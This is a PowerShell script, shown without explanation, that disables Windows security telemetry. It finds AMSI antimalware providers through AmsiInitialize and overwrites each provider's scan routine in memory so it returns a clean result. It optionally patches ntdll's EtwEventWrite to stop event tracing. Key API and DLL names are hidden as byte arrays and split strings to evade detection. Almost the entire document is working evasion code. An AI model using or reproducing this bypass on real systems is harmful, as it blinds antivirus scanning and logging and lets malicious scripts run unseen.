function Get-Function
{
    Param(
        [string] $module,
        [string] $function
    )
    $moduleHandle = $GetModule.Invoke($null, @($module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $moduleHandle)
    $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $function))
}
function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )
    $type = [AppDomain]::("Curren" + "tDomain").DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()
    $marshalClass::("GetDelegate" +"ForFunctionPointer")($funcAddr, $delegate)
}
try {
    Add-Type -AssemblyName System.Windows.Forms
}
catch {
    Throw "[!] Failed to add WinForms assembly"
}
$marshalClass = [System.Runtime.InteropServices.Marshal]
$unsafeMethodsType = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
$bytesGetProc = [Byte[]](71, 0, 101, 0, 116, 0, 80, 0, 114, 0, 111, 0, 99, 0, 65, 0, 100, 0, 100, 0, 114, 0, 101, 0, 115, 0, 115, 0)
$bytesGetMod =  [Byte[]](71, 0, 101, 0, 116, 0, 77, 0, 111, 0, 100, 0, 117, 0, 108, 0, 101, 0, 72, 0, 97, 0, 110, 0, 100, 0, 108, 0, 101, 0)
$GetProc = [Text.Encoding]::Unicode.GetString($bytesGetProc)
$GetMod = [Text.Encoding]::Unicode.GetString($bytesGetMod)
$GetModule = $unsafeMethodsType.GetMethod($GetMod)
if ($GetModule -eq $null) {
    Throw "[!] Error getting the $GetMod address"
}
$GetAddres = $unsafeMethodsType.GetMethod($GetProc)
if ($GetAddres -eq $null) {
    Throw "[!] Error getting the $GetProc address"
}
$bytes4msiInit = [Byte[]](65, 109 , 115, 105, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101)
$bytes4msi = [Byte[]](97, 109, 115, 105, 46, 100, 108, 108)
$4msi = [System.Text.Encoding]::ASCII.GetString($bytes4msi)
$4msiInit = [System.Text.Encoding]::ASCII.GetString($bytes4msiInit)
$4msiAddr = Get-Function $4msi $4msiInit
if ($4msiAddr -eq $null) {
    Throw "[!] Error getting the $4msiInit address"
}
$PtrSize = $marshalClass::SizeOf([Type][IntPtr])
if ($PtrSize -eq 8) {
    $Initialize = Get-Delegate $4msiAddr @([string], [UInt64].MakeByRefType()) ([Int])
    [Int64]$ctx = 0
} else {
    $Initialize = Get-Delegate $4msiAddr @([string], [IntPtr].MakeByRefType()) ([Int])
    $ctx = 0
}
$replace = 'Virt' + 'ualProtec'
$name = '{0}{1}' -f $replace, 't'
$protectAddr = Get-Function ("ker{0}.dll" -f "nel32") $name
if ($protectAddr -eq $null) {
    Throw "[!] Error getting the $name address"
}
$protect = Get-Delegate $protectAddr @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$PAGE_EXECUTE_WRITECOPY = 0x00000080
$patch = [byte[]] (184, 0, 0, 0, 0, 195)
$p = 0; $i = 0
if ($Initialize.Invoke("Scanner", [ref]$ctx) -ne 0) {
    if ($ctx -eq 0) {
        return
    } else {
        Throw "[!] Error call $4msiInit"
    }
}
if ($PtrSize -eq 8) {
    $CAmsiAntimalware = $marshalClass::ReadInt64([IntPtr]$ctx, 16)
    $AntimalwareProvider = $marshalClass::ReadInt64([IntPtr]$CAmsiAntimalware, 64)
} else {
    $CAmsiAntimalware = $marshalClass::ReadInt32($ctx+8)
    $AntimalwareProvider = $marshalClass::ReadInt32($CAmsiAntimalware+36)
}
while ($AntimalwareProvider -ne 0)
{
    if ($PtrSize -eq 8) {
        $AntimalwareProviderVtbl = $marshalClass::ReadInt64([IntPtr]$AntimalwareProvider)
        $AmsiProviderScanFunc = $marshalClass::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)
    } else {
        $AntimalwareProviderVtbl = $marshalClass::ReadInt32($AntimalwareProvider)
        $AmsiProviderScanFunc = $marshalClass::ReadInt32($AntimalwareProviderVtbl + 12)
    }
    if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $PAGE_EXECUTE_WRITECOPY, [ref]$p)) {
        Throw "[!] Error changing the permissions of provider: $AmsiProviderScanFunc"
    }
    try {
        $marshalClass::Copy($patch, 0, [IntPtr]$AmsiProviderScanFunc, 6)
    }
    catch {
        Throw "[!] Error writing patch in address:  $AmsiProviderScanFunc"
    }
    for ($x = 0; $x -lt $patch.Length; $x++) {
        $byteValue = $marshalClass::ReadByte([IntPtr]::Add($AmsiProviderScanFunc, $x))
        if ($byteValue -ne $patch[$x]) {
            Throw "[!] Error when patching in the address: $AmsiProviderScanFunc"
        }
    }
    if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $p, [ref]$p)) {
        Throw "[!] Failed to restore memory protection of provider: $AmsiProviderScanFunc"
    }
    $i++
    if ($PtrSize -eq 8) {
        $AntimalwareProvider = $marshalClass::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$PtrSize))
    } else {
        $AntimalwareProvider = $marshalClass::ReadInt32($CAmsiAntimalware+36 + ($i*$PtrSize))
    }
}
if ($etw) {
    $etwFunc = [Text.Encoding]::ASCII.GetString([Byte[]](69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101))
    $etwAddr = Get-Function ("nt{0}.dll" -f "dll") $etwFunc
    if ($etwAddr -eq $null) {
        Throw "[!] Error getting the $etwFunc address"
    }
    if (!$protect.Invoke($etwAddr, 1, $PAGE_EXECUTE_WRITECOPY, [ref]$p)) {
        Throw "[!] Error changing the permissions $etwFunc"
    }
    try {
        if ($PtrSize -eq 8) {
            $marshalClass::WriteByte($etwAddr, 0xC3)
        } else {
            $patch = [byte[]] (0xb8, 0xff, 0x55)
            $marshalClass::Copy($patch, 0, [IntPtr]$etwAddr, 3)
        }
    }
    catch {
         Throw "[!] Error writing patch $etwFunc"
    }
    
    if (!$protect.Invoke($etwAddr, 1, $p, [ref]$p)) {
        Throw "[!] Failed to restore memory protection of $etwFunc"
    }
    if ($PtrSize -eq 8) {
        $byteValue = $marshalClass::ReadByte([IntPtr]::Add($etwAddr, 0))
        if ($byteValue -ne 0xc3) {
            Throw "[!] Error when patching $etwFunc"
        }
    } else {
        for ($x = 0; $x -lt 3; $x++) {
            $byteValue = $marshalClass::ReadByte([IntPtr]::Add($etwAddr, $x))
            if ($byteValue -ne $patch[$x]) {
                Throw "[!] Error when patching $etwFunc"
        }
    }
    }
}
